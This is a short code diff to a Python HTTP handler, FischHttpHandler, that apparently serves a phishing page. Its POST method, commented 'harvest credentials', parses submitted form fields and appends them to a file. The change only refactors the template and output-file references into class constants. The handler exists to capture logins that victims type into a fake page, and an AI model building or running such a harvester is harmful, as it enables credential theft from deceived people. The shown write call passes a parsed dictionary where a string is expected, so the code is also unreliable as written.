@@ -40,7 +40,7 @@ class FischHttpHandler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         self._set_response()
-        self.wfile.write(bytes(self.template, "utf8"))
+        self.wfile.write(bytes(FischHttpHandler.TEMPLATE, "utf8"))
 
     def do_POST(self):
         # harvest credentials
@@ -50,7 +50,7 @@ class FischHttpHandler(BaseHTTPRequestHandler):
         if post_data:
             try:
                 parsed = parse_qs(post_data.decode('utf-8'))
-                with open(self.outfile, "a") as out:
+                with open(FischHttpHandler.OUTFILE, "a") as out:
                     out.write(parsed)
             except Exception as ex:
                 logging.error(ex)
